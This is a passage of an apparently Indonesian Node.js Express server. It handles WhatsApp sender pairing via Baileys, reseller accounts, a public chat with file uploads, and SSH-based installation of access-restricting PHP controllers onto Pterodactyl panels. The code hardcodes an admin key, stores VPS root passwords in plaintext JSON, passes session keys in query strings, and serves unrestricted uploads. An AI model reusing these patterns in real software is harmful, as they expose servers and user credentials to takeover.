// Endpoint untuk mendapatkan daftar sender dengan detail lengkap
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  
  // Tambahkan informasi status yang lebih detail
  const connectionsWithStatus = conns.map(conn => {
    const sessionId = conn.id || conn.number;
    const isActive = activeConnections[sessionId]?.status === 'connected';
    const status = isActive ? 'connected' : (activeConnections[sessionId] ? 'connecting' : 'disconnected');
    
    return {
      ...conn,
      status: status,
      lastActive: activeConnections[sessionId]?.lastActive || null
    };
  });
  
  console.log(`📱 Senders for ${user.username}: ${connectionsWithStatus.length}`);
  
  return res.json({
    valid: true,
    connections: connectionsWithStatus
  });
});

// Helper function untuk membaca session credentials
function getActiveCredsInFolder(username) {
  const sessionDir = path.join('session', username);
  
  if (!fs.existsSync(sessionDir)) {
    return [];
  }
  
  const senders = [];
  const folders = fs.readdirSync(sessionDir);
  
  for (const folder of folders) {
    const credsPath = path.join(sessionDir, folder, 'creds.json');
    if (fs.existsSync(credsPath)) {
      try {
        const creds = JSON.parse(fs.readFileSync(credsPath, 'utf-8'));
        // Coba baca nama dari creds atau gunakan nama folder
        const sessionName = creds?.me?.name || folder;
        const phoneNumber = creds?.me?.id?.split(':')[0] || folder;
        
        senders.push({
          id: folder,
          sessionName: sessionName,
          phoneNumber: phoneNumber,
          registered: true,
          createdAt: fs.statSync(credsPath).birthtime
        });
      } catch (err) {
        console.log(`Error reading creds for ${folder}: ${err.message}`);
        // Jika error, tetap tampilkan sebagai sender
        senders.push({
          id: folder,
          sessionName: folder,
          phoneNumber: folder,
          registered: false,
          error: true
        });
      }
    } else {
      // Folder tanpa creds.json (mungkin pairing in progress)
      senders.push({
        id: folder,
        sessionName: folder,
        phoneNumber: folder,
        registered: false,
        status: 'pending'
      });
    }
  }
  
  return senders;
}

let usePairingCode = true;

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false });
  }
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
    const sessionDir = path.join('session', user.username, number);

    if (!fs.existsSync(`session/${user.username}`)) fs.mkdirSync(`session/${user.username}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      printQRInTerminal: !usePairingCode,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
                ...message
              }
            }
          };
        }
        return message;
      },
      version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      logger: pino({ level: 'fatal' }),
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
      }
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          await pairingWa(number, user.username);
        } else {
          delete activeConnections[number];
        }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      console.log(code)
      if (code) {
        return res.json({ valid: true, number, pairingCode: code });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});
app.get("/refreshCoins", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key" });
  }  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);  
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }  
  if (user.coins === undefined || user.coins === null) {
    user.coins = 100;
    saveDatabase(db);
  }
  return res.json({
    valid: true,
    coins: user.coins,
    bCoins: user.coins,
    lCoins: user.coins,
    username: user.username,
    role: user.role || "member"
  });
});
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }
  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  if (!creator || !["reseller", "owner"].includes(creator.role)) {
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }
  if (db.find(u => u.username === newUser)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync(LOG_FILE, logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }
  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !["owner", "reseller"].includes(admin.role)) {
  return res.json({
    valid: true,
    authorized: false,
    message: "Unauthorized"
  });
}

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===================== VPS & PROTECT PANEL ENDPOINTS =====================

// Storage untuk session VPS (gunakan database untuk production)
let vpsSessions = {};

// File untuk menyimpan sessions
const VPS_SESSIONS_FILE = path.join(__dirname, 'database/vps_sessions.json');

// Load VPS sessions dari file
function loadVpsSessions() {
  try {
    if (fs.existsSync(VPS_SESSIONS_FILE)) {
      vpsSessions = JSON.parse(fs.readFileSync(VPS_SESSIONS_FILE, 'utf8'));
      logSuccess(`Loaded ${Object.keys(vpsSessions).length} VPS sessions`);
    }
  } catch (err) {
    logError('Error loading VPS sessions:', err);
  }
}

// Save VPS sessions ke file
function saveVpsSessions() {
  try {
    const dir = path.dirname(VPS_SESSIONS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(VPS_SESSIONS_FILE, JSON.stringify(vpsSessions, null, 2));
    logSuccess(`Saved ${Object.keys(vpsSessions).length} VPS sessions`);
  } catch (err) {
    logError('Error saving VPS sessions:', err);
  }
}

// Load sessions saat startup
loadVpsSessions();

// ========================= 🔐 LOGIN VPS =========================
app.get('/api/vps/login', async (req, res) => {
    const { key, ip, password, port } = req.query;
    
    // Validasi key
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    
    if (!ip || !password) {
        return res.json({ valid: false, message: 'IP and password required' });
    }
    
    const ssh = new NodeSSH();
    const vpsPort = port ? parseInt(port) : 22;
    
    try {
        // Cek apakah user sudah login ke VPS lain
        if (vpsSessions[userId]) {
            const { host } = vpsSessions[userId];
            return res.json({ 
                valid: true, 
                success: false, 
                message: `⚠️ Kamu sudah login ke VPS: ${host}\n\nLogout dulu sebelum login ke VPS lain.` 
            });
        }
        
        await ssh.connect({
            host: ip,
            username: "root",
            password: password,
            port: vpsPort
        });
        
        ssh.dispose();
        
        // Simpan sesi
        vpsSessions[userId] = {
            host: ip,
            username: "root",
            password: password,
            port: vpsPort,
            loginTime: new Date().toISOString()
        };
        saveVpsSessions();
        
        logSuccess(`${userId} login ke VPS ${ip}`);
        
        res.json({
            valid: true,
            success: true,
            message: `✅ Login Berhasil!\n🌐 IP: ${ip}\n📦 Port: ${vpsPort}`,
            host: ip,
            port: vpsPort
        });
        
    } catch (err) {
        logError('Login VPS error:', err);
        res.json({ 
            valid: true, 
            success: false, 
            message: `❌ Gagal login ke VPS: ${err.message}` 
        });
    }
});

const multer = require('multer');

app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const uploadDir = path.join(__dirname, 'uploads');
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const unique = Date.now() + '-' + Math.round(Math.random() * 1E9);
        const ext = path.extname(file.originalname);
        cb(null, unique + ext);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 } // Maksimal 50MB
});

// Path file data
const DATA_DIR = path.join(__dirname, 'ROOM');
const CHAT_FILE = path.join(DATA_DIR, 'public-chat.json');

// Pastikan folder data ada
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Inisialisasi file chat jika belum ada
if (!fs.existsSync(CHAT_FILE)) {
    fs.writeFileSync(CHAT_FILE, JSON.stringify([], null, 2));
}

// Helper: Baca chat
function readChat() {
    try {
        const data = fs.readFileSync(CHAT_FILE, 'utf8');
        return JSON.parse(data);
    } catch (err) {
        console.error('Error reading chat file:', err);
        return [];
    }
}

// Helper: Tulis chat
function writeChat(messages) {
    try {
        fs.writeFileSync(CHAT_FILE, JSON.stringify(messages, null, 2));
        return true;
    } catch (err) {
        console.error('Error writing chat file:', err);
        return false;
    }
}

// Helper: Format waktu (WIB)
function getFormattedTime() {
    const now = new Date();
    const options = {
        timeZone: 'Asia/Jakarta',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    };
    return now.toLocaleTimeString('id-ID', options);
}

// Helper: Deteksi tipe media dari filename
function getMediaType(filename) {
    const ext = path.extname(filename).toLowerCase();
    if (['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp'].includes(ext)) return 'image';
    if (['.mp4', '.mov', '.avi', '.mkv', '.webm'].includes(ext)) return 'video';
    if (['.mp3', '.m4a', '.wav', '.aac', '.ogg'].includes(ext)) return 'audio';
    if (['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt'].includes(ext)) return 'document';
    return 'file';
}

// Helper: Format ukuran file
function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
    return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
}

// ==================== ENDPOINT GET PUBLIC CHAT ====================
app.get('/get-public-chat', (req, res) => {
    try {
        const messages = readChat();
        const lastMessages = messages.slice(-100); // Ambil 100 pesan terakhir
        
        res.json({
            success: true,
            messages: lastMessages,
            total: messages.length
        });
    } catch (error) {
        console.error('Error in /get-public-chat:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

// ==================== ENDPOINT SEND PUBLIC CHAT (DENGAN FILE) ====================
app.post('/send-public-chat', upload.single('file'), (req, res) => {
    try {
        const { username, message, media_type } = req.body;
        
        // Validasi username
        if (!username) {
            return res.status(400).json({
                success: false,
                error: 'Username diperlukan'
            });
        }
        
        if (username.length > 30) {
            return res.status(400).json({
                success: false,
                error: 'Username terlalu panjang (maksimal 30 karakter)'
            });
        }
        
        // Validasi pesan (harus ada teks atau file)
        const hasText = message && message.trim().length > 0;
        const hasFile = req.file !== undefined;
        
        if (!hasText && !hasFile) {
            return res.status(400).json({
                success: false,
                error: 'Pesan atau file diperlukan'
            });
        }
        
        // Validasi panjang pesan teks
        if (hasText && message.length > 500) {
            return res.status(400).json({
                success: false,
                error: 'Pesan terlalu panjang (maksimal 500 karakter)'
            });
        }
        
        // Buat objek pesan baru
        const newMessage = {
            id: Date.now(),
            username: username,
            message: message && message.trim() || '',
            time: getFormattedTime(),
            timestamp: Date.now()
        };
        
        // Jika ada file yang diupload
        if (hasFile) {
            const fileUrl = `/uploads/${req.file.filename}`;
            const fileType = media_type || getMediaType(req.file.originalname);
            const fileSize = formatFileSize(req.file.size);
            
            newMessage.media_url = fileUrl;
            newMessage.media_type = fileType;
            newMessage.file_name = req.file.originalname;
            newMessage.file_size = fileSize;
            newMessage.file_size_bytes = req.file.size;
        }
        
        // Baca dan simpan chat
        const messages = readChat();
        messages.push(newMessage);
        
        // Batasi maksimal 1000 pesan
        if (messages.length > 1000) {
            messages.splice(0, messages.length - 1000);
        }
        
        if (writeChat(messages)) {
            const logMsg = `[CHAT] ${username}: ${hasText ? message.substring(0, 50) : '[Media]'} ${hasFile ? `(${req.file.originalname})` : ''}`;
            console.log(logMsg);
            
            res.json({
                success: true,
                message: newMessage,
                total: messages.length
            });
        } else {
            throw new Error('Gagal menyimpan chat');
        }
        
    } catch (error) {
        console.error('Error in /send-public-chat:', error);
        res.status(500).json({
            success: false,
            error: 'Gagal mengirim pesan: ' + error.message
        });
    }
});

// ==================== ENDPOINT DELETE CHAT (Admin) ====================
app.delete('/delete-public-chat/:id', (req, res) => {
    try {
        const { id } = req.params;
        const { adminKey } = req.query;
        
        if (adminKey !== 'rahasiaadmin123') {
            return res.status(403).json({
                success: false,
                error: 'Unauthorized'
            });
        }
        
        let messages = readChat();
        const deletedMessage = messages.find(msg => msg.id == id);
        const initialLength = messages.length;
        messages = messages.filter(msg => msg.id != id);
        
        if (messages.length === initialLength) {
            return res.status(404).json({
                success: false,
                error: 'Pesan tidak ditemukan'
            });
        }
        
        // Hapus file media jika ada
        if (deletedMessage && deletedMessage.media_url) {
            const filePath = path.join(__dirname, deletedMessage.media_url);
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
                console.log(`[DELETED] File: ${deletedMessage.media_url}`);
            }
        }
        
        writeChat(messages);
        
        res.json({
            success: true,
            message: 'Pesan berhasil dihapus'
        });
        
    } catch (error) {
        console.error('Error in /delete-public-chat:', error);
        res.status(500).json({
            success: false,
            error: 'Gagal menghapus pesan'
        });
    }
});

// ==================== ENDPOINT CLEAR ALL CHAT (Admin) ====================
app.delete('/clear-public-chat', (req, res) => {
    try {
        const { adminKey } = req.query;
        
        if (adminKey !== 'rahasiaadmin123') {
            return res.status(403).json({
                success: false,
                error: 'Unauthorized'
            });
        }
        
        const messages = readChat();
        
        // Hapus semua file media
        messages.forEach(msg => {
            if (msg.media_url) {
                const filePath = path.join(__dirname, msg.media_url);
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                }
            }
        });
        
        writeChat([]);
        
        res.json({
            success: true,
            message: 'Semua pesan berhasil dihapus'
        });
        
    } catch (error) {
        console.error('Error in /clear-public-chat:', error);
        res.status(500).json({
            success: false,
            error: 'Gagal menghapus pesan'
        });
    }
});

// ==================== ENDPOINT GET SINGLE MESSAGE ====================
app.get('/get-public-chat/:id', (req, res) => {
    try {
        const { id } = req.params;
        const messages = readChat();
        const message = messages.find(msg => msg.id == id);
        
        if (!message) {
            return res.status(404).json({
                success: false,
                error: 'Pesan tidak ditemukan'
            });
        }
        
        res.json({
            success: true,
            message: message
        });
        
    } catch (error) {
        console.error('Error in /get-public-chat/:id:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

// ==================== ENDPOINT DELETE FILE (Admin) ====================
app.delete('/delete-file/:filename', (req, res) => {
    try {
        const { filename } = req.params;
        const { adminKey } = req.query;
        
        if (adminKey !== 'rahasiaadmin123') {
            return res.status(403).json({
                success: false,
                error: 'Unauthorized'
            });
        }
        
        const filePath = path.join(__dirname, 'uploads', filename);
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            res.json({
                success: true,
                message: 'File berhasil dihapus'
            });
        } else {
            res.status(404).json({
                success: false,
                error: 'File tidak ditemukan'
            });
        }
        
    } catch (error) {
        console.error('Error in /delete-file:', error);
        res.status(500).json({
            success: false,
            error: 'Gagal menghapus file'
        });
    }
});

// ==================== ENDPOINT STATISTIK ====================
app.get('/chat-stats', (req, res) => {
    try {
        const messages = readChat();
        
        // Hitung statistik per user
        const userStats = {};
        let totalMedia = 0;
        let totalImages = 0;
        let totalVideos = 0;
        let totalAudios = 0;
        let totalFiles = 0;
        
        messages.forEach(msg => {
            // Statistik user
            if (!userStats[msg.username]) {
                userStats[msg.username] = 0;
            }
            userStats[msg.username]++;
            
            // Statistik media
            if (msg.media_type) {
                totalMedia++;
                switch (msg.media_type) {
                    case 'image': totalImages++; break;
                    case 'video': totalVideos++; break;
                    case 'audio': totalAudios++; break;
                    default: totalFiles++; break;
                }
            }
        });
        
        const topUsers = Object.entries(userStats)
            .map(([username, count]) => ({ username, count }))
            .sort((a, b) => b.count - a.count)
            .slice(0, 10);
        
        res.json({
            success: true,
            stats: {
                totalMessages: messages.length,
                uniqueUsers: Object.keys(userStats).length,
                totalMedia: totalMedia,
                mediaBreakdown: {
                    images: totalImages,
                    videos: totalVideos,
                    audios: totalAudios,
                    files: totalFiles
                },
                lastMessage: messages.length > 0 ? {
                    username: messages[messages.length - 1].username,
                    message: messages[messages.length - 1].message,
                    time: messages[messages.length - 1].time
                } : null,
                topUsers: topUsers
            }
        });
        
    } catch (error) {
        console.error('Error in /chat-stats:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

// ==================== ENDPOINT SEARCH MESSAGES ====================
app.get('/search-chat', (req, res) => {
    try {
        const { q } = req.query;
        if (!q) {
            return res.status(400).json({
                success: false,
                error: 'Query parameter "q" diperlukan'
            });
        }
        
        const messages = readChat();
        const searchTerm = q.toLowerCase();
        const results = messages.filter(msg => 
            msg.message.toLowerCase().includes(searchTerm) ||
            msg.username.toLowerCase().includes(searchTerm)
        ).slice(-50); // Maksimal 50 hasil
        
        res.json({
            success: true,
            results: results,
            total: results.length
        });
        
    } catch (error) {
        console.error('Error in /search-chat:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

// Delete chat for myself
app.delete('/delete-my-chat/:id', (req, res) => {
  const { id } = req.params;
  const { username } = req.query;
  
  let messages = readChat();
  const messageIndex = messages.findIndex(msg => msg.id == id);
  
  if (messageIndex === -1) {
    return res.status(404).json({ success: false, error: 'Pesan tidak ditemukan' });
  }
  
  if (messages[messageIndex].username !== username) {
    return res.status(403).json({ success: false, error: 'Tidak bisa menghapus pesan orang lain' });
  }
  
  messages[messageIndex].message = '[Pesan dihapus]';
  messages[messageIndex].media_url = null;
  messages[messageIndex].deleted = true;
  
  writeChat(messages);
  res.json({ success: true, message: 'Pesan dihapus' });
});

// ========================= 🚪 LOGOUT VPS =========================
app.get('/api/vps/logout', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    
    if (!vpsSessions[userId]) {
        return res.json({ valid: true, success: false, message: '⚠️ Kamu belum login ke VPS mana pun.' });
    }
    
    const target = vpsSessions[userId];
    delete vpsSessions[userId];
    saveVpsSessions();
    
    logSuccess(`${userId} logout dari VPS ${target.host}`);
    
    res.json({
        valid: true,
        success: true,
        message: `✅ Logout Berhasil!\n🌐 IP: ${target.host}`,
        host: target.host
    });
});

// ========================= 🛡️ INSTALL PROTECT1 =========================
app.get('/api/installprotect1', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ 
            valid: true, 
            success: false, 
            message: '⚠️ Kamu belum login ke VPS! Gunakan /api/vps/login dulu.' 
        });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        // File ServerController.php
        const serverControllerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Servers;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\User;
use Pterodactyl\\Models\\Nest;
use Pterodactyl\\Models\\Location;
use Spatie\\QueryBuilder\\QueryBuilder;
use Spatie\\QueryBuilder\\AllowedFilter;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Models\\Filters\\AdminServerFilter;
use Illuminate\\Contracts\\View\\Factory as ViewFactory;

class ServerController extends Controller
{
    /**
     * Konstruktor
     */
    public function __construct(private ViewFactory $view)
    {
    }

/**
 * 📋 Daftar server — hanya tampilkan milik sendiri kecuali admin ID 1
 */
public function index(Request $request): View
{
    $user = Auth::user();

    // Ambil query dasar
$query = Server::query()
    ->with(['node', 'user', 'allocation'])
    ->orderBy('id', 'asc'); // server baru di bawah

    // NDyProtect v1.5 — Batasi query utama
    if ($user->id !== 1) {
        $query->where('owner_id', $user->id);
    }

    // Gunakan QueryBuilder tapi tetap batasi hasil user
    $servers = QueryBuilder::for($query)
        ->allowedFilters([
            AllowedFilter::exact('owner_id'),
            AllowedFilter::custom('*', new AdminServerFilter()),
        ])
        ->when($request->has('filter') && isset($request->filter['search']), function ($q) use ($request) {
            $search = $request->filter['search'];
            $q->where(function ($sub) use ($search) {
                $sub->where('name', 'like', "%{$search}%")
                    ->orWhere('uuidShort', 'like', "%{$search}%")
                    ->orWhere('uuid', 'like', "%{$search}%");
            });
        })
        ->paginate(config('pterodactyl.paginate.admin.servers'))
        ->appends($request->query());

    return $this->view->make('admin.servers.index', ['servers' => $servers]);
}

    /**
     * 🧱 Form buat server baru
     */
    public function create(): View
    {
        $user = Auth::user();

        if ($user->id === 1) {
            // Admin ID 1 bisa pilih owner siapa pun
            $users = User::all();
            $lock_owner = false;
            $auto_owner = null;
        } else {
            // User biasa hanya bisa membuat server untuk dirinya sendiri
            $users = collect([$user]);
            $lock_owner = true;
            $auto_owner = $user;
        }

        return $this->view->make('admin.servers.new', [
            'users' => $users,
            'lock_owner' => $lock_owner,
            'auto_owner' => $auto_owner,
            'locations' => Location::with('nodes')->get(),
            'nests' => Nest::with('eggs')->get(),
        ]);
    }

    /**
     * 🔍 Detail/Edit Server — hanya pemilik server atau admin ID 1
     */
    public function view(Server $server): View
    {
        $user = Auth::user();

        if ($user->id !== 1 && $server->owner_id !== $user->id) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat melihat atau mengedit server ini! ©Protect By @SuikaOfficial.');
        }

        return $this->view->make('admin.servers.view', ['server' => $server]);
    }

    /**
     * 🛠 Update Server — hanya pemilik server atau admin ID 1
     */
    public function update(Request $request, Server $server)
    {
        $user = Auth::user();

        if ($user->id !== 1 && $server->owner_id !== $user->id) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat mengubah server ini! ©Protect By @SuikaOfficial.');
        }

        // Lindungi agar user biasa tidak bisa ubah owner_id
        $data = $request->except(['owner_id']);

        $server->update($data);

        return redirect()->route('admin.servers.view', $server->id)
            ->with('success', '✅ Server berhasil diperbarui.');
    }

    /**
     * ❌ Hapus Server — hanya Admin ID 1
     */
    public function destroy(Server $server)
    {
        $user = Auth::user();

        if ($user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat menghapus server ini! ©Protect By @SuikaOfficial.');
        }

        $server->delete();

        return redirect()->route('admin.servers')
            ->with('success', '🗑️ Server berhasil dihapus.');
    }
}`;
        
        // Upload file ke VPS
        const tempFile = path.join(__dirname, 'temp_ServerController.php');
        fs.writeFileSync(tempFile, serverControllerCode);
        await ssh.putFile(tempFile, '/var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerController.php');
        fs.unlinkSync(tempFile);
        
        ssh.dispose();
        
        logSuccess(`Protect1 installed by ${userId} on ${session.host}`);
        
        res.json({
            valid: true,
            success: true,
            protect_name: 'PROTECT1',
            file_path: '/var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerController.php',
            message: '✅ Proteksi 1 berhasil dipasang! Anti Intip Server aktif.'
        });
        
    } catch (err) {
        logError('Install protect1 error:', err);
        res.json({ 
            valid: true, 
            success: false, 
            message: `❌ Gagal memasang proteksi: ${err.message}` 
        });
    }
});

// ========================= 🛡️ INSTALL PROTECT2 =========================
app.get('/api/installprotect2', async (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ valid: false, message: 'Invalid session key' });
    }
    
    const userId = keyInfo.username;
    const session = vpsSessions[userId];
    
    if (!session) {
        return res.json({ valid: true, success: false, message: '⚠️ Login ke VPS dulu!' });
    }
    
    const ssh = new NodeSSH();
    
    try {
        await ssh.connect({
            host: session.host,
            username: session.username,
            password: session.password,
            port: session.port || 22
        });
        
        const userControllerCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\User;
use Pterodactyl\\Models\\Model;
use Illuminate\\Support\\Collection;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Spatie\\QueryBuilder\\QueryBuilder;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Illuminate\\Contracts\\Translation\\Translator;
use Pterodactyl\\Services\\Users\\UserUpdateService;
use Pterodactyl\\Traits\\Helpers\\AvailableLanguages;
use Pterodactyl\\Services\\Users\\UserCreationService;
use Pterodactyl\\Services\\Users\\UserDeletionService;
use Pterodactyl\\Http\\Requests\\Admin\\UserFormRequest;
use Pterodactyl\\Http\\Requests\\Admin\\NewUserFormRequest;
use Pterodactyl\\Contracts\\Repository\\UserRepositoryInterface;

class UserController extends Controller
{
    use AvailableLanguages;

    /**
     * UserController constructor.
     */
    public function __construct(
        protected AlertsMessageBag $alert,
        protected UserCreationService $creationService,
        protected UserDeletionService $deletionService,
        protected Translator $translator,
        protected UserUpdateService $updateService,
        protected UserRepositoryInterface $repository,
        protected ViewFactory $view
    ) {
    }

    /**
     * Display user index page.
     */
public function index(Request $request): View
{
    $authUser = $request->user();

    $query = User::query()
        ->select('users.*')
        ->selectRaw('COUNT(DISTINCT(subusers.id)) as subuser_of_count')
        ->selectRaw('COUNT(DISTINCT(servers.id)) as servers_count')
        ->leftJoin('subusers', 'subusers.user_id', '=', 'users.id')
        ->leftJoin('servers', 'servers.owner_id', '=', 'users.id')
        ->groupBy('users.id');

    // Jika bukan admin ID 1, hanya tampilkan dirinya sendiri
    if ($authUser->id !== 1) {
        $query->where('users.id', $authUser->id);
    }

    $users = QueryBuilder::for($query)
        ->allowedFilters(['username', 'email', 'uuid'])
        ->allowedSorts(['id', 'uuid'])
        ->paginate(50);

    return $this->view->make('admin.users.index', ['users' => $users]);
}

    /**
     * Display new user page.
     */
    public function create(): View
    {
        return $this->view->make('admin.users.new', [
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    /**
     * Display user view page.
     */
    public function view(User $user): View
    {
        return $this->view->make('admin.users.view', [
            'user' => $user,
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    /**
     * Delete a user from the system.
     *
     * @throws \\Exception
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
public function delete(Request $request, User $user): RedirectResponse
{
    $authUser = $request->user();

    // ❌ Jika bukan admin ID 1 -> larang delete user manapun
    if ($authUser->id !== 1) {
        throw new DisplayException("🚫 Akses ditolak: hanya admin ID 1 yang dapat menghapus user! ©Protect By @SuikaOfficial");
    }

    // ❌ Admin ID 1 tidak boleh hapus dirinya sendiri
    if ($authUser->id === $user->id) {
        throw new DisplayException("❌ Tidak bisa menghapus akun Anda sendiri.");
    }

    // Lanjut hapus user
    $this->deletionService->handle($user);

    $this->alert->success("🗑️ User berhasil dihapus.")->flash();
    return redirect()->route('admin.users');
}

    /**
     * Create a user.
     */
    public function store(NewUserFormRequest $request): RedirectResponse
    {
        $authUser = $request->user();
        $data = $request->normalize();

        // Jika user bukan admin ID 1 dan mencoba membuat user admin
        if ($authUser->id !== 1 && isset($data['root_admin']) && $data['root_admin'] == true) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat membuat user admin! ©Protect By @SuikaOfficial.");
        }

        // Semua user selain ID 1 akan selalu membuat user biasa
        if ($authUser->id !== 1) {
            $data['root_admin'] = false;
        }

        // Buat user baru
        $user = $this->creationService->handle($data);

        $this->alert->success("✅ Akun user berhasil dibuat (level: user biasa).")->flash();
        return redirect()->route('admin.users.view', $user->id);
    }


    /**
     * Update a user on the system.
     *
